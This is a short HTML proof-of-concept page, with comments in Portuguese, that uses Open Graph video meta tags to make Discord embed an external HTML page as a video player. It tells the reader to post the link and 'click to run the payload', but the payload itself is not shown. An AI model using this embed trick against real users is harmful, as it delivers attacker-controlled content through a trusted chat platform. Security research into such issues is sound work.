<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Discord Video Embed POC</title>

  <!-- Open Graph meta tags para gerar o embed de vídeo -->
  <meta property="og:title" content="Video Embed Test">
  <meta property="og:description" content="Clique para executar o payload.">
  <meta property="og:type" content="video">
  <meta property="og:video" content="https://0xd4v1.github.io/testing/test.html">
  <meta property="og:video:type" content="text/html">
  <meta property="og:video:width" content="640">
  <meta property="og:video:height" content="360">

  <!-- (Opcional) oEmbed para reforçar o embed -->
  <link rel="alternate" type="application/json+oembed" href="https://seusite.com/oembed.json">
</head>
<body>
  <h1>Discord Video Embed POC</h1>
  <p>Poste este link no Discord para ver o player apontando para <code>/test.html</code>.</p>
</body>
</html>
